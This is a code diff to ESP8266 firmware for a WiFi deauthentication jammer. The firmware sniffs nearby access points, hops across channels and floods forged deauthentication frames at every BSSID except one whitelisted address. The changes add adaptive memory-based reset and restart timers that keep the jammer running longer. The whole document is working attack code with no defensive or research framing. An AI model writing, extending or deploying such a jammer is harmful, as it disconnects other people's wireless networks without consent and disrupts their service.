@@ -8,7 +8,7 @@ extern "C" {
 #define MAX_APS 100
 #define CHANNELS 14
 
-// Whitelist only this MAC address (BSSID)
+// Whitelist your MAC address (BSSID)
 uint8_t whitelistBSSID[6] = {0x9C, 0x53, 0x22, 0xE7, 0x2F, 0x07};
 
 struct AP {
@@ -22,11 +22,12 @@ int apCount = 0;
 int currentChannel = 1;
 
 unsigned long lastSwitch = 0;
-unsigned long switchInterval = 100; // milliseconds channel switch time
+unsigned long switchInterval = 100; // ms per channel
 
 unsigned long lastReset = 0;
-const unsigned long resetInterval = 600000; // reset AP list every 10 minutes
-const unsigned long rebootInterval = 3600000; // restart device every 1 hour
+unsigned long resetInterval = 600000;   // Start with 10 minutes
+unsigned long lastRestart = 0;
+unsigned long restartInterval = 1800000; // Start with 30 minutes
 
 uint8_t deauthPacket[26] = {
   0xc0, 0x00,
@@ -37,6 +38,14 @@ uint8_t deauthPacket[26] = {
   0x00, 0x00,
   0x07, 0x00
 };
+
+void printBSSID(uint8_t *bssid) {
+  for (int i = 0; i < 6; i++) {
+    if (bssid[i] < 0x10) Serial.print("0");
+    Serial.print(bssid[i], HEX);
+    if (i < 5) Serial.print(":");
+  }
+}
 
 bool isWhitelistedBSSID(uint8_t *bssid) {
   for (int i = 0; i < 6; i++) {
@@ -62,14 +71,6 @@ void ICACHE_RAM_ATTR sniffer_callback(uint8_t *buf, uint16_t len) {
   }
 }
 
-void printBSSID(uint8_t *bssid) {
-  for (int i = 0; i < 6; i++) {
-    if (bssid[i] < 0x10) Serial.print("0");
-    Serial.print(bssid[i], HEX);
-    if (i < 5) Serial.print(":");
-  }
-}
-
 void setup() {
   Serial.begin(115200);
   WiFi.mode(WIFI_STA);
@@ -77,12 +78,15 @@ void setup() {
   wifi_promiscuous_enable(0);
   wifi_set_promiscuous_rx_cb(sniffer_callback);
   wifi_promiscuous_enable(1);
-  Serial.println("Starting WiFi Jammer...");
+  Serial.println("Starting WiFi Jammer with dynamic timers...");
+  lastReset = millis();
+  lastRestart = millis();
 }
 
 void loop() {
   unsigned long now = millis();
 
+  // Channel hopping 
   if (now - lastSwitch > switchInterval) {
     currentChannel++;
     if (currentChannel > CHANNELS) currentChannel = 1;
@@ -90,19 +94,42 @@ void loop() {
     lastSwitch = now;
   }
 
-  // Periodically reset AP list to free memory
+  // Adaptive AP list reset based on free heap
   if (now - lastReset > resetInterval) {
     apCount = 0;
-    Serial.println("Cleared AP list to prevent memory exhaustion.");
+    Serial.print("AP list cleared to free memory. Free heap: ");
+    Serial.println(ESP.getFreeHeap());
+
+    // Adjust reset interval according to free heap
+    if (ESP.getFreeHeap() < 10000) {          // Less than 10 KB heap
+      resetInterval = 300000;                  // Reset every 5 min
+    } else if (ESP.getFreeHeap() < 20000) {   // 10-20 KB heap
+      resetInterval = 600000;                  // Reset every 10 min
+    } else {                                  // More than 20 KB heap
+      resetInterval = 900000;                  // Reset every 15 min
+    }
+
     lastReset = now;
   }
 
-  // Restart the ESP8266 every hour for stability
-  if (now > rebootInterval) {
-    Serial.println("Restarting device for stability.");
+  // Adaptive auto restart timer based on free heap
+  if (now - lastRestart > restartInterval) {
+    Serial.print("Restarting ESP for stability. Free heap: ");
+    Serial.println(ESP.getFreeHeap());
+
+    // Adjust restart interval similarly
+    if (ESP.getFreeHeap() < 10000) {          // Low memory
+      restartInterval = 900000;                // Restart every 15 min
+    } else if (ESP.getFreeHeap() < 20000) {
+      restartInterval = 1800000;               // Every 30 min
+    } else {
+      restartInterval = 3600000;               // Every 60 min
+    }
+
     ESP.restart();
   }
 
+  // Main jamming loop
   for (int i = 0; i < apCount; i++) {
     if (isWhitelistedBSSID(aps[i].bssid)) {
       Serial.print("Skipping whitelisted BSSID: ");
@@ -110,6 +137,7 @@ void loop() {
       Serial.println();
       continue;
     }
+
     Serial.print("Jamming BSSID: ");
     printBSSID(aps[i].bssid);
     Serial.print(" on Channel: ");
@@ -119,7 +147,7 @@ void loop() {
     memcpy(&deauthPacket[10], aps[i].bssid, 6);
     memcpy(&deauthPacket[16], aps[i].bssid, 6);
     wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
-    yield();  // Feed watchdog
+    yield();  // Feed the watchdog
     delay(1);
   }
 }
